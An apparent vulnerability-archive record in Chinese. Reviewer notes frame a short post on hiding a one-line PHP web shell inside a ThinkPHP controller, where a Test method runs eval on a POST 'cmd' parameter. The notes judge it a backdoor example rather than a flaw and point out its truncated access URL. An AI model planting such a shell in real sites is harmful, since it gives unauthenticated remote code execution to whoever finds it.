---
source: "hatch 补库批 20260928"
product: "ThinkPHP / 控制器后门示例"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp专用shell"
prerequisites: "来源所述条件，未列明部分仍待核：未指定框架版本；必须已有写控制器权限"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-b1f904b340a3aeacbb6ed266"
entity_id: "ve-b1f904b340a3aeacbb6ed266"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：未指定框架版本；必须已有写控制器权限

代码与实验材料：只有Test.test里eval(POST cmd)，不是漏洞利用；URL结尾截断

来源证据范围：无原始来源

- **结论使用边界（1）**：不应作为漏洞条目；依据：需要先创建控制器PHP文件，本质后门植入示例，不能证明框架存在漏洞。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **代码与转录边界（2）**：访问路径错误或截断；依据：URL止于/index/tes，未对应Test控制器/test操作。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **适用与权限边界（3）**：永久后门风险未说明；依据：任意POST代码执行无认证，不应纳入普通验证PoC。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 专用shell

一、漏洞简介
------------

基于thinkphp框架的一句话写法
thinkphp框架使用入口文件调用控制器，直接写一句话可能会有解析问题导致无法执行指令，研究了一下把一句话套入框架控制器的方法，分享给大家参考，

二、漏洞影响
------------

三、复现过程
------------

在index的控制器文件夹下建立Test.php文件，代码如下:

    <?php 
    namespace app\index\controller; 

    class Test 

    { 

        public function test() 

        { 

        eval($_POST["cmd"]); 

        } 

    }

一句话的地址就是http://www.0-sec.org/index/tes
